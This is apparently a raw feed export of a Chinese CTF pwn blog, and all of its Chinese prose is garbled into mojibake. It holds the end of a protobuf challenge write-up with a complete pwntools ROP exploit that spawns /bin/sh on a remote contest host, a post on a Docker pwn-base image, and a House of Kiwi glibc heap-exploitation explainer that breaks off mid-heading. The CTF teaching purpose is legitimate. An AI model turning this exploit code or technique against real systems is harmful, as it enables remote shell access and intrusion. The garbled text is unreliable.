class="language-bash">ç„¶åæ‰§è¡Œ</span><br>source /etc/profile<br></code></pre></td></tr></table></figure><p>é…ç½®åŠ¨æ€é“¾æ¥åº“</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">åœ¨æ–‡ä»¶/etc/ld.so.confä¸­æ·»åŠ ä¸‹é¢ä¸€è¡Œ</span><br>/usr/local/protobuf/lib #ï¼ˆæ³¨æ„: åœ¨æ–°è¡Œå¤„æ·»åŠ ï¼‰<br><span class="hljs-meta prompt_"> </span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">æ›´æ”¹å®Œæˆä¹‹åæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤</span><br>ldconfig<br></code></pre></td></tr></table></figure><p>é…ç½®å¥½ç›¸å…³ç¯å¢ƒåï¼ŒæŒ‰ç…§å¦‚ä¸‹æ“ä½œï¼Œåˆ†è§£å‡ºäº†<code>ctf_pb2.py</code>å’Œ<code>ctf.proto</code>æ–‡ä»¶</p><p>ä½¿ç”¨è‡ªåŠ¨åŒ–å·¥å…·åˆ†ææå–.pyæ–‡ä»¶ï¼š<a href="https://github.com/marin-m/pbtk">https://github.com/marin-m/pbtk</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip3 install protobuf<br>./extractors/from_binary.py [-h] input_file [output_dir] # å¾—åˆ°ctf.ptoto<br><br>pip3 install google<br>pip3 install protobuf<br>protoc -I=./ --python_out=./ ctf.proto  # å¾—åˆ°ctf_pb2.py<br></code></pre></td></tr></table></figure><p><img src="/img/article/protocol/image-20221101212237685.png" alt="image-20221101212237685"></p><blockquote><p>å¦‚æœæ˜¾ç¤ºæ²¡æœ‰protoæŒ‡ä»¤ï¼Œå¯ä»¥å®‰è£…protobuf-compileråå†æ¬¡å°è¯•</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install protobuf-compiler<br></code></pre></td></tr></table></figure><p>.protoæ–‡ä»¶é‡Œå­˜æ”¾äº†messageçš„ç»“æ„ä¿¡æ¯</p><p><img src="/img/article/protocol/image-20221101212357009.png" alt="image-20221101212357009"></p><p>ç„¶åå°†pyæ–‡ä»¶ä½œä¸ºåº“å¯¼å…¥ï¼Œå³å¯åˆ©ç”¨å®ƒçš„æ¥å£å®Œæˆæ¶ˆæ¯ä¼ é€’ï¼Œæˆ‘ä¼ é€’messageçš„å‡½æ•°å¦‚ä¸‹å®šä¹‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">new_pwn</span>(<span class="hljs-params">payload</span>):<br>    <span class="hljs-keyword">global</span> io<br>    io.recvuntil(<span class="hljs-string">&#x27;Login: &#x27;</span>)<br>    person = pwn()<br>    person.username = <span class="hljs-string">b&#x27;admin&#x27;</span><br>    person.password = payload<br>    io.send(person.SerializeToString())<br></code></pre></td></tr></table></figure><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>ç»¼åˆä¸Šè¿°åˆ†æï¼Œæˆ‘ä»¬åœ¨é€å…¥passwordæ—¶å­˜åœ¨æº¢å‡ºæ¼æ´ï¼Œä½†æ˜¯ROPä¸­çš„å«æœ‰çš„<strong>\x00</strong>éš¾ä»¥ç›´æ¥é€å…¥ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨whileå¾ªç¯å¤šæ¬¡é€å…¥ä¸åŒé•¿åº¦çš„å­—ç¬¦ä¸²ï¼Œä½¿å¾—å­—ç¬¦ä¸²ç»“å°¾æ·»åŠ çš„<strong>\x00</strong>è¢«æˆ‘ä»¬åˆ©ç”¨ã€‚åŒæ—¶éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éœ€è¦å€’ç€ä¸€ç‚¹ä¸€ç‚¹å†™å¥½ROPï¼Œ**&#x2F;bin&#x2F;sh**çš„å­—ç¬¦ä¸²æˆ‘ä»¬å¯ä»¥åœ¨æœ€åå†™å…¥å…¨å±€å˜é‡ï¼Œåªè¦è®°ä½å¯¹åº”åœ°å€å³å¯ï¼ŒåŒæ—¶ç»“æŸwhileå¾ªç¯è°ƒç”¨ROPé“¾ã€‚</p><p><img src="/img/article/protocol/image-20221101214354465.png" alt="image-20221101214354465"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctf_pb2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn  <span class="hljs-keyword">import</span> *<br><br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new_pwn</span>(<span class="hljs-params">payload</span>):<br>    <span class="hljs-keyword">global</span> io<br>    io.recvuntil(<span class="hljs-string">&#x27;Login: &#x27;</span>)<br>    person = pwn()<br>    person.username = <span class="hljs-string">b&#x27;admin&#x27;</span><br>    person.password = payload<br>    io.send(person.SerializeToString())<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">clear</span>(<span class="hljs-params">num</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>        payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x248</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*num + <span class="hljs-string">b&#x27;c&#x27;</span>*(<span class="hljs-number">8</span>-i)<br>        new_pwn(payload)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">mode,ip = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port = <span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">global</span> io<br>    <span class="hljs-keyword">if</span> mode == <span class="hljs-number">0</span>:<br>        io = process(<span class="hljs-string">&#x27;./protocol&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        io = remote(ip,port)<br>    <br>    <span class="hljs-comment">#0x0000000000403c99 : syscall</span><br>    <span class="hljs-comment">#binsh</span><br>    <span class="hljs-comment">#0x0000000000404982 : pop rdi ; ret</span><br>    <span class="hljs-comment">#0</span><br>    <span class="hljs-comment">#0x0000000000588bbe : pop rsi ; ret</span><br>    <span class="hljs-comment">#59</span><br>    <span class="hljs-comment">#0x00000000005bdb8a : pop rax ; ret</span><br>    <span class="hljs-comment">#0</span><br>    <span class="hljs-comment">#0x000000000040454f : pop rdx ; ret</span><br>    <br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x248</span> +<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x40</span> + <span class="hljs-string">b&#x27;\x99\x3c\x40&#x27;</span><br>    new_pwn(payload)<br>    <br>    clear(<span class="hljs-number">0x38</span>)<br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x248</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x38</span> + <span class="hljs-string">b&#x27;\x6f\xa3\x81&#x27;</span><br>    new_pwn(payload)<br>    <br>    clear(<span class="hljs-number">0x30</span>)<br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x248</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x30</span> + <span class="hljs-string">b&#x27;\x82\x49\x40&#x27;</span><br>    new_pwn(payload)<br>    <br>    clear(<span class="hljs-number">0x28</span>)<br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x248</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x28</span><br>    new_pwn(payload)<br>    <br>    clear(<span class="hljs-number">0x20</span>)<br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x248</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x20</span> + <span class="hljs-string">b&#x27;\xbe\x8b\x58&#x27;</span><br>    new_pwn(payload)<br>    <br>    clear(<span class="hljs-number">0x18</span>)<br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x248</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x18</span> + <span class="hljs-string">b&#x27;\x3b&#x27;</span><br>    new_pwn(payload)<br>    <br>    clear(<span class="hljs-number">0x10</span>)<br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x248</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x10</span> + <span class="hljs-string">b&#x27;\x8a\xdb\x5b&#x27;</span><br>    new_pwn(payload)<br>    <br>    clear(<span class="hljs-number">0x8</span>)<br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x248</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x08</span><br>    new_pwn(payload)<br>    <br>    clear(<span class="hljs-number">0x0</span>)<br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x248</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x00</span> + <span class="hljs-string">b&#x27;\x4f\x45\x40&#x27;</span><br>    new_pwn(payload)<br>    <br>    pause()<br>    io.recvuntil(<span class="hljs-string">&#x27;Login:&#x27;</span>)<br>    person = pwn()<br>    person.username = <span class="hljs-string">b&#x27;admin&#x27;</span><br>    person.password = <span class="hljs-string">b&#x27;admin&#x27;</span><br>    payload = person.SerializeToString() + <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br>    io.send(payload)<br>    <br>    <br>    io.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;210.30.97.133&#x27;</span>,<span class="hljs-number">28091</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>é€‚ç”¨å¤šç‰ˆæœ¬libcçš„pwn-base</title>
    <link href="/2022/10/28/%E9%80%82%E7%94%A8%E5%A4%9A%E7%89%88%E6%9C%AClibc%E7%9A%84pwn-base/"/>
    <url>/2022/10/28/%E9%80%82%E7%94%A8%E5%A4%9A%E7%89%88%E6%9C%AClibc%E7%9A%84pwn-base/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç”±äºç»å¸¸è¦åœ¨æ ¡å†…çš„CTFdå¹³å°ä¸Šé¢˜ï¼Œä¸ä½¿ç”¨pwn-baseçš„æ„å»ºæ–¹å¼ä¼šä½¿å¾—é•œåƒä½“ç§¯è¿‡å¤§ï¼Œæµªè´¹è®¸å¤šæœåŠ¡å™¨çš„å­˜å‚¨ç©ºé—´ã€‚ä½†ä½¿ç”¨pwn-baseçš„æƒ…å†µä¸‹ï¼Œä¸åŒé¢˜ç›®libcè¦æ±‚ä¸åŒï¼Œåˆéœ€è¦æ„å»ºå¤šä¸ªpwn-baseç¯å¢ƒï¼Œè¿‡äºéº»çƒ¦ã€‚å› è€Œåˆ›å»ºäº†è¿™ä¸ªå¯æ ¹æ®éœ€æ±‚è‡ªè¡Œæ›´æ¢libcç‰ˆæœ¬çš„pwn-baseï¼Œæœ‰éœ€è¦å¯ä»¥è‡ªå·±ä¸‹è½½æºç æ›´æ”¹ï¼Œé“¾æ¥åœ¨ä¸‹æ–¹ï¼š</p><blockquote><p>dockerï¼šloora1n&#x2F;Ubuntu2.35</p><p>é“¾æ¥ï¼š<a href="https://github.com/Loora1N/pwnbase/tree/main/Ubuntu2.35">pwnbase&#x2F;Ubuntu2.35 at main Â· Loora1N&#x2F;pwnbase (github.com)</a></p></blockquote><p>è¿™ä¸ªåº“é‡ŒåŒæ—¶è¿˜åŒ…å«ä¹‹å‰åˆ¶ä½œçš„Kernel pwn base</p><p><img src="/img/article/pwnbase/image-20221028202807333.png" alt="pwnbase"></p><h2 id="é»˜è®¤libcç‰ˆæœ¬"><a href="#é»˜è®¤libcç‰ˆæœ¬" class="headerlink" title="é»˜è®¤libcç‰ˆæœ¬"></a>é»˜è®¤libcç‰ˆæœ¬</h2><blockquote><p>GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35. Copyright (C) 2022 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Compiled by GNU CC version 11.2.0. libc ABIs: UNIQUE IFUNC ABSOLUTE For bug reporting instructions, please see: <a href="https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs">https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs</a>.</p></blockquote><h2 id="ä½¿ç”¨æ–¹å¼"><a href="#ä½¿ç”¨æ–¹å¼" class="headerlink" title="ä½¿ç”¨æ–¹å¼"></a>ä½¿ç”¨æ–¹å¼</h2><p>é¦–å…ˆåœ¨åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ç”¨äºæ„å»ºä½ çš„é¢˜ç›®é•œåƒï¼Œå¦‚æˆ‘è¿™é‡Œçš„pwnæ–‡ä»¶å¤¹</p><p><img src="/img/article/pwnbase/image-20221028203034274.png" alt="é¢˜ç›®æ–‡ä»¶å¤¹"></p><p>å°†ä½ çš„é¢˜ç›®å’Œæ‰€éœ€çš„libc, ldæ–‡ä»¶ä¹Ÿæ”¾å…¥è¿™é‡Œï¼Œæ–°å»ºä¸€ä¸ªDockerfileï¼Œç²˜è´´å¦‚ä¸‹å†…å®¹å³å¯</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> loora1n/ubuntu2.<span class="hljs-number">35</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> helloworld /pwn/pwn</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ld-2.32.so /pwn/ld-2.32.so</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> libc-2.32.so /pwn/libc-2.32.so</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /pwn/pwn &amp;&amp; \</span><br><span class="language-bash">    patchelf --set-interpreter /pwn/ld-2.32.so /pwn/pwn &amp;&amp; \</span><br><span class="language-bash">    patchelf --replace-needed libc.so.6 /pwn/libc-2.32.so /pwn/pwn   </span><br></code></pre></td></tr></table></figure><p>åªéœ€æ›¿æ¢<code>COPY</code>åç´§æŒ¨ç€çš„æ–‡ä»¶åå³å¯ï¼Œæˆ‘è¿™é‡Œä»¥libcç‰ˆæœ¬éœ€æ±‚ä¸º2.32çš„helloworldä¸ºä¾‹ã€‚</p><p>ä¿å­˜åï¼Œå¼€å§‹æ„å»ºé¢˜ç›®é•œåƒå³å¯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker build -t usrname/image .<br>docker push usrname/image<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€IO_FILEã€‘House of kiwi</title>
    <link href="/2022/10/27/%5BIO_FILE%5DHouse%20of%20kiwi/"/>
    <url>/2022/10/27/%5BIO_FILE%5DHouse%20of%20kiwi/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><blockquote><p>å‚è€ƒåšå®¢å¦‚ä¸‹ï¼š</p><p><a href="https://bbs.pediy.com/thread-273746.htm">ä»PWNé¢˜NULL_FXCKä¸­å­¦åˆ°çš„glibcçŸ¥è¯†</a></p><p><a href="https://www.anquanke.com/post/id/235598">House OF Kiwi</a></p></blockquote><p>CTFçš„Pwné¢˜é‡Œé¢,é€šå¸¸å°±ä¼šé‡åˆ°ä¸€äº›åŠ äº†æ²™ç›’çš„é¢˜ç›®,è¿™ç§åŠ æ²™ç›’çš„é¢˜ç›®,åœ¨2.29ä¹‹åçš„å †é¢˜ä¸­,é€šå¸¸ä¸ºä»¥ä¸‹ä¸¤ç§æ–¹å¼</p><ul><li>åŠ«æŒ<code>__free_hook</code>,åˆ©ç”¨ç‰¹å®šçš„gadget,å°†æ ˆè¿›è¡Œè¿ç§»</li><li>åŠ«æŒ<code>__malloc_hook</code>ä¸º<code>setcontext+61</code>çš„gadget,ä»¥åŠåŠ«æŒ<code>IO_list_all</code>å•é“¾è¡¨ä¸­çš„æŒ‡é’ˆåœ¨exitç»“æŸä¸­,åœ¨<code>_IO_cleanup</code>å‡½æ•°ä¼šè¿›è¡Œç¼“å†²åŒºçš„åˆ·æ–°,ä»è€Œè¯»å–flag</li></ul><p>å› ä¸º<code>setcontext + 61</code>ä»2.29ä¹‹åå˜ä¸ºç”±RDXå¯„å­˜å™¨æ§åˆ¶å¯„å­˜å™¨äº†,æ‰€ä»¥éœ€è¦æ§åˆ¶RDXå¯„å­˜å™¨çš„æŒ‡å‘çš„ä½ç½®çš„éƒ¨åˆ†æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs assembly">&lt;setcontext+61&gt;:    mov    rsp,QWORD PTR [rdx+0xa0]<br>&lt;setcontext+68&gt;:    mov    rbx,QWORD PTR [rdx+0x80]<br>&lt;setcontext+75&gt;:    mov    rbp,QWORD PTR [rdx+0x78]<br>&lt;setcontext+79&gt;:    mov    r12,QWORD PTR [rdx+0x48]<br>&lt;setcontext+83&gt;:    mov    r13,QWORD PTR [rdx+0x50]<br>&lt;setcontext+87&gt;:    mov    r14,QWORD PTR [rdx+0x58]<br>&lt;setcontext+91&gt;:    mov    r15,QWORD PTR [rdx+0x60]<br>&lt;setcontext+95&gt;:    test   DWORD PTR fs:0x48,0x2<br>&lt;setcontext+107&gt;:    je     0x7ffff7e31156 &lt;setcontext+294&gt;<br>...<br>&lt;setcontext+294&gt;:    mov    rcx,QWORD PTR [rdx+0xa8]<br>&lt;setcontext+301&gt;:    push   rcx<br>&lt;setcontext+302&gt;:    mov    rsi,QWORD PTR [rdx+0x70]<br>&lt;setcontext+306&gt;:    mov    rdi,QWORD PTR [rdx+0x68]<br>&lt;setcontext+310&gt;:    mov    rcx,QWORD PTR [rdx+0x98]<br>&lt;setcontext+317&gt;:    mov    r8,QWORD PTR [rdx+0x28]<br>&lt;setcontext+321&gt;:    mov    r9,QWORD PTR [rdx+0x30]<br>&lt;setcontext+325&gt;:    mov    rdx,QWORD PTR [rdx+0x88]<br>&lt;setcontext+332&gt;:    xor    eax,eax<br>&lt;setcontext+334&gt;:    ret<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯å¦‚æœå°†exitå‡½æ•°æ›¿æ¢æˆ<code>_exit</code>å‡½æ•°,æœ€ç»ˆç»“æŸçš„æ—¶å€™,åˆ™æ˜¯è¿›è¡Œäº†syscallæ¥ç»“æŸ,å¹¶æ²¡æœ‰æœºä¼šè°ƒç”¨<code>_IO_cleanup</code>,è‹¥å†å°†<code>__malloc_hook</code>å’Œ<code>__free_hook</code>ç»™banäº†,ä¸”åœ¨è¾“å…¥å’Œè¾“å‡ºéƒ½ç”¨readå’Œwriteçš„æƒ…å†µä¸‹,æ— æ³•hookä¸”æ— æ³•é€šè¿‡IOåˆ·æ–°ç¼“å†²åŒºè¿›è¡Œè°ƒç”¨,è¿™æ—¶å€™å°±æ¶‰åŠåˆ°ptmallocæºç é‡Œé¢äº†</p><h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><ul><li>èƒ½å¤Ÿè§¦å‘<code>_malloc_assert</code>ï¼Œé€šå¸¸ç”±å †æº¢å‡ºå¯¼è‡´</li><li>èƒ½å¤Ÿä»»æ„åœ°å€å†™ï¼Œä¿®æ”¹ <code>_IO_file_sync</code> å’Œ<code>IO_helper_jumps + 0xA0 and 0xA8</code></li></ul><h2 id="åˆ©ç”¨åŸç†"><a href="#åˆ©ç”¨åŸç†" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h2><p><code>glibc</code>ä¸­<code>ptmalloc</code>éƒ¨åˆ†,ä»ä»¥å‰åˆ°ç°åœ¨éƒ½å­˜åœ¨ä¸€ä¸ª<code>assret</code>æ–­è¨€çš„é—®é¢˜,æ­¤å¤„å­˜åœ¨ä¸€ä¸ª<code>fflush(stderr)</code>çš„å‡½æ•°è°ƒç”¨,å…¶ä¸­ä¼šè°ƒç”¨<code>_IO_file_jumps</code>ä¸­çš„<code>sync</code>æŒ‡é’ˆ</p><blockquote><p>GLibc 2.32&#x2F;malloc:288</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br>__malloc_assert (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *assertion, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> line,<br>       <span class="hljs-type">const</span> <span class="hljs-type">char</span> *function)<br>&#123;<br>(<span class="hljs-type">void</span>) __fxprintf (<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,<br>           __progname, __progname[<span class="hljs-number">0</span>] ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>           file, line,<br>           function ? function : <span class="hljs-string">&quot;&quot;</span>, function ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>           assertion);<br>fflush (<span class="hljs-built_in">stderr</span>);<br><span class="hljs-built_in">abort</span> ();<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p> è¿™é‡Œæ”¾ä¸€ä¸ªæˆ‘å¸¸ç”¨æ¥æŸ¥è¯¢glibcæºç çš„ç½‘å€ï¼š<a href="https://elixir.bootlin.com/glibc/latest/source">Glibc source code - Bootlin</a></p></blockquote><p><img src="/img/article/house_of_kiwi/image-20221026101620627-1666750587623-2.png" alt="image-20221026101620627"></p><p>åœ¨<code>_int_malloc</code>ä¸­å­˜åœ¨ä¸€ä¸ª assert (chunk_main_arena (bck-&gt;bk));ä½ç½®å¯ä»¥è§¦å‘,æ­¤å¤–å½“<code>top_chunk</code>çš„å¤§å°ä¸å¤Ÿåˆ†é…æ—¶,åˆ™ä¼šè¿›å…¥sysmallocä¸­</p><blockquote><p>GLIBC 2.32&#x2F;malloc.c:2394</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">......<br>assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="hljs-number">0</span>) ||<br>        ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;<br>         prev_inuse (old_top) &amp;&amp;<br>         ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) old_end &amp; (pagesize - <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>));<br>......<br></code></pre></td></tr></table></figure><p>æ­¤å¤„ä¼šå¯¹top_chunkçš„<code>size|flags</code>è¿›è¡Œassertåˆ¤æ–­</p><ul><li>old_size &gt;&#x3D; 0x20;</li><li>old_top.prev_inuse &#x3D; 0;</li><li>old_topé¡µå¯¹é½</li></ul><p>é€šè¿‡è¿™é‡Œä¹Ÿå¯ä»¥è§¦å‘assert<br>ä¸‹é¢æ‰‹åŠ¨å®ç°è¿›å…¥assertå,å¯ä»¥æƒ³åˆ°fflushå’Œfxprintféƒ½å’ŒIOæœ‰å…³,å¯èƒ½éœ€è¦æ¶‰åŠIO,ä¸€æ­¥æ­¥è°ƒè¯•çœ‹çœ‹å¯ä»¥å‘ç°åœ¨<code>fflush</code>å‡½æ•°ä¸­è°ƒç”¨åˆ°äº†ä¸€ä¸ªæŒ‡é’ˆ:ä½äº<code>_IO_file_jumps</code>ä¸­çš„<code>_IO_file_sync</code>æŒ‡é’ˆ,ä¸”è§‚å¯Ÿå‘ç°RDXå¯„å­˜å™¨çš„å€¼ä¸º<code>IO_helper_jumps</code>æŒ‡é’ˆ,å¤šæ¬¡è°ƒè¯•å‘ç°RDXå§‹ç»ˆæ˜¯ä¸€ä¸ªå›ºå®šçš„åœ°å€</p><p><img src="/img/article/house_of_kiwi/t01f675c08902cf9575.png" alt="img"></p><p>å¦‚æœå­˜åœ¨ä¸€ä¸ªä»»æ„å†™,é€šè¿‡ä¿®æ”¹ <code>_IO_file_jumps + 0x60</code>çš„<code>_IO_file_sync</code>æŒ‡é’ˆä¸º<code>setcontext+61</code><br>ä¿®æ”¹<code>IO_helper_jumps + 0xA0 and 0xA8</code>åˆ†åˆ«ä¸ºå¯è¿ç§»çš„å­˜æ”¾æœ‰ROPçš„ä½ç½®å’ŒretæŒ‡ä»¤çš„gadgetä½ç½®,åˆ™å¯ä»¥è¿›è¡Œæ ˆè¿ç§»</p><h2 id="ä¾‹é¢˜ä»‹ç»"><a href="#ä¾‹é¢˜ä»‹ç»" class="headerlink" title="ä¾‹é¢˜ä»‹ç»"></a>ä¾‹é¢˜ä»‹ç»</h2><blockquote><p>ä»¥NepCTF 2021å¹´ä¸­NULL_FxCKä¸ºä¾‹</p></blockquote><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><h4 